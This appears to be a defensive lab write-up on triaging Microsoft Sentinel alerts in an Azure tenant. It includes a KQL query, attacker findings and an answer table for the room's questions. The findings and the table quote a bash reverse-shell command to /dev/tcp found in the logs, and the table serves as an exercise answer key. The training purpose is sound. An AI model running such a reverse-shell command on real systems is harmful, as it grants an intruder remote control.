# SOC Alert Triaging - Tinsel Triage

## Overview
In this room, we took on the role of a SOC Analyst to manage an "alert rain" within an **Azure tenant**. The objective was to move from chaotic alert flooding to a structured triaging process and perform deep log analysis using **Microsoft Sentinel (SIEM/SOAR)**.

The goal was to identify real threats from the "Evil Bunnies" group, prioritize high-severity incidents, and reconstruct the attack timeline using KQL.

---

## The Triage Methodology
When alerts flood the dashboard, we apply four fundamental dimensions to prioritize response:
* **Severity:** Review the alert's severity rating (Informational to Critical) to indicate urgency.
* **Time:** Identify when the alert was triggered and check for related activity.
* **Context:** Determine the attack stage (reconnaissance, persistence, etc.).
* **Impact:** Identify the affected asset and its importance to operations.

---

## Initial Triage (Microsoft Sentinel)
By reviewing the **Incidents** tab in Sentinel, we identified several high-risk activities. A key observation was the correlation between multiple alerts affecting the same entities, indicating a multi-stage compromise.

### Key Incidents Observed:
- `Linux PrivEsc - Polkit Exploit Attempt`
- `Linux PrivEsc - Sudo Shadow Access`
- `Linux PrivEsc - Kernel Module Insertion`

---

## In-Depth Log Analysis (KQL)
To validate the alerts, we moved from the high-level summary to raw log analysis using **Kusto Query Language (KQL)**. By querying the `Syslog_CL` table, we could see the exact commands executed by the attacker.

### Example Query (Investigating app-02):
```kusto
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'app-02'
| project _timestamp_t, host_s, Message
```
### Findings on `app-02` and `websrv-01`:
- **Credential Harvesting**: Execution of `cp` (copy) command to create a shadow file backup.
- **Persistence**: Installation of a malicious kernel module named `malicious_mod.ko`.
- **Reverse Shell**: A suspicious command was found on `websrv-01`: `/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1`.
- **Privilege Escalation**: New users (like `deploy` or `Alice`) were added to the sudoers group to maintain high-level access.

---

## Answers Summary

| Question | Answer |
| :--- | :--- |
| How many entities are affected by the Linux PrivEsc - Polkit Exploit Attempt alert? | 10 |
| What is the severity of the Linux PrivEsc - Sudo Shadow Access alert? | High |
| How many accounts were added to the sudoers group in the Linux PrivEsc - User Added to Sudo Group alert? | 4 |
| What is the name of the kernel module installed in websrv-01? | malicious_mod.ko |
| What is the unusual command executed within websrv-01 by the ops user? | /bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1 |
| What is the source IP address of the first successful SSH login to storage-01? | 172.16.0.12 |
| What is the external source IP that successfully logged in as root to app-01? | 203.0.113.45 |
| Aside from the backup user, what is the name of the user added to the sudoers group inside app-01? | deploy |

---

## Lessons Learned
- **Correlation is Power**: Multiple alerts linked to a single entity (machine, user, or IP) typically indicate different stages of a single intrusion rather than isolated incidents.
- **KQL Proficiency**: Using editable KQL queries allows an analyst to pivot from a general alert to uncovering the "full story" and specific attacker actions.
- **Visibility**: Microsoft Sentinel provides essential visibility into the Azure tenant, allowing analysts to detect, investigate, and respond to threats in real time.
- **Triaging Saves Time**: A structured triage process ensures that time and resources are focused on real malicious behavior instead of noise or false positives.

---

> **Key Takeaway**: The vulnerability isn't just a single exploit; it's the sequence of events. By triaging and correlating alerts, we turn "noise" into an actionable attack timeline.
